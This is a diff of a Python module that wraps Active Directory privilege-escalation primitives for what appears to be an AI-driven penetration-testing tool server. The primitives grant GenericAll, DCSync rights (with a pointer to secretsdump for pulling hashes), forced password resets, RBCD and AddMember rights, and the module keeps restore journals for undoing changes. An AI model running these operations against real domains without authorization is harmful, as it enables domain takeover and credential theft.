@@ -2,28 +2,26 @@
 adpwn_tools.py  –  LDAP privilege-escalation primitives for pentestmcp.
 
 Calls the adpwn Python API directly (no subprocess overhead).
-adpwn is vendored at /home/eric/pentestMCP/adpwn/ – one directory above this
-file.  sys.path is patched on import so 'import adpwn' just works.
+The adpwn package is vendored inside this repo (./adpwn/).
 
-All functions are async so they fit the FastMCP / asyncio pattern used in
-the rest of pentestMCP.  They return the standard dict shape:
+All functions are async so they fit the FastMCP / asyncio pattern.
+They return the standard dict shape:
   {"success": bool, "summary": str, "findings": list, "raw_output": str}
 and, on write operations, a "restore_file" key pointing at the journal file
-that adpwn_acl_restore() can replay to undo the change.
+that adpwn_restore_journal() can replay to undo the change.
 """
 import os
 import sys
 
 # ------------------------------------------------------------------
 # Make the vendored adpwn package importable.
-# This file lives at  /home/eric/pentestMCP/tools/adpwn_tools.py
-# adpwn lives at      /home/eric/pentestMCP/adpwn/
-# We just need to add the parent of both (/home/eric/pentestMCP) to sys.path.
+# This file lives at  <repo>/adpwn_tools.py
+# adpwn lives at      <repo>/adpwn/
+# We add <repo> (this file's directory) to sys.path.
 # ------------------------------------------------------------------
 _HERE = os.path.dirname(os.path.abspath(__file__))
-_PARENT = os.path.dirname(_HERE)          # /home/eric/pentestMCP
-if _PARENT not in sys.path:
-    sys.path.insert(0, _PARENT)
+if _HERE not in sys.path:
+    sys.path.insert(0, _HERE)
 
 from adpwn.config import Identity, connect_ldap, AuthError
 from adpwn import primitives
@@ -72,7 +70,7 @@ async def adpwn_add_generic_all(host, domain, username, password,
     try:
         identity = _make_identity(host, domain, username, password, nthash)
         conn = connect_ldap(identity)
-        target_dn, _   = primitives.resolve_principal(conn, target)
+        target_dn, _    = primitives.resolve_principal(conn, target)
         _,  trustee_sid = primitives.resolve_principal(conn, trustee)
         data = primitives.grant_full_control(conn, target_dn, trustee_sid)
         data['restore_file'] = _journal(identity, 'grant_full_control', data)
@@ -90,7 +88,7 @@ async def adpwn_add_generic_all(host, domain, username, password,
 async def adpwn_add_dcsync(host, domain, username, password, trustee, nthash=''):
     """
     Grant DCSync rights (GetChanges + GetChangesAll) on the domain root
-    to *trustee*.  After this, run ad_dcsync / secretsdump to pull hashes.
+    to *trustee*.  After this, run secretsdump to pull hashes.
     Writes a restore journal.
     """
     try:
@@ -182,14 +180,17 @@ async def adpwn_set_password(host, domain, username, password,
     """
     Force-reset a user account password via LDAP
     (requires ForceChangePassword right on the target).
-    Writes a restore journal (note: original password is NOT recoverable).
+    NOTE: the original password is NOT recoverable.
+    Writes a restore journal (marked non-reversible).
     """
     try:
         identity = _make_identity(host, domain, username, password, nthash)
         conn = connect_ldap(identity)
         target_dn, _ = primitives.resolve_principal(conn, target)
         data = primitives.reset_password(conn, target_dn, new_password)
-        data['restore_file'] = _journal(identity, 'reset_password', data)
+        data['restore_file'] = _journal(identity, 'reset_password', {
+            **data, 'success': False  # mark non-reversible
+        })
         data.setdefault('findings', [])
         data['summary'] = (
             f"Password reset for {target}. "
@@ -205,7 +206,6 @@ async def adpwn_add_rbcd(host, domain, username, password,
                          target, trustee, nthash=''):
     """
     Configure Resource-Based Constrained Delegation (RBCD) on a computer object.
-    After this, use getST.py or Rubeus s4u to request the impersonation ticket.
     Writes a restore journal.
     """
     try:
@@ -227,22 +227,24 @@ async def adpwn_add_rbcd(host, domain, username, password,
 
 
 async def adpwn_add_addmember_priv(host, domain, username, password,
-                                   target_group, trustee, nthash=''):
+                                   target, trustee, nthash=''):
     """
     Grant WriteProperty/AddMember right on a group to a trustee.
     Use when you have WriteDacl over the group but not direct membership write.
     Writes a restore journal.
+
+    FIX: parameter renamed from target_group → target to match adpwn_cli.py call.
     """
     try:
         identity = _make_identity(host, domain, username, password, nthash)
         conn = connect_ldap(identity)
-        group_dn,   _  = primitives.resolve_principal(conn, target_group)
+        group_dn,   _  = primitives.resolve_principal(conn, target)
         _, trustee_sid = primitives.resolve_principal(conn, trustee)
         data = primitives.grant_addmember_privilege(conn, group_dn, trustee_sid)
         data['restore_file'] = _journal(identity, 'grant_addmember_privilege', data)
         data.setdefault('findings', [])
         data['summary'] = (
-            f"AddMember right on {target_group} granted to {trustee}. "
+            f"AddMember right on {target} granted to {trustee}. "
             f"Restore journal: {data['restore_file']}"
         )
         data.setdefault('raw_output', str(data))
@@ -255,10 +257,6 @@ async def adpwn_restore_journal(host, domain, username, password,
                                 restore_file, nthash=''):
     """
     Replay an adpwn restore journal in reverse to undo all recorded LDAP changes.
-    Works for both 'adpwn path' chain-walks and direct primitive calls.
-
-    Fix (v2): RestoreOperation.run() is the correct method (not .restore()).
-    Pre-populate _passwords so getpass() is never called non-interactively.
     """
     try:
         # Build credential string (same logic as _make_identity)
@@ -269,10 +267,6 @@ async def adpwn_restore_journal(host, domain, username, password,
             else:
                 cred = nthash
 
-        # RestoreOperation manages its own LDAP connections and prompts for
-        # passwords interactively via getpass by default.  Pre-populate the
-        # internal _passwords cache keyed by (sam.lower(), domain.lower())
-        # so run() never blocks waiting for stdin.
         op = RestoreOperation(restore_file, server=host)
         sam = username.split('@')[0] if '@' in username else username
         op._passwords[(sam.lower(), domain.lower())] = cred
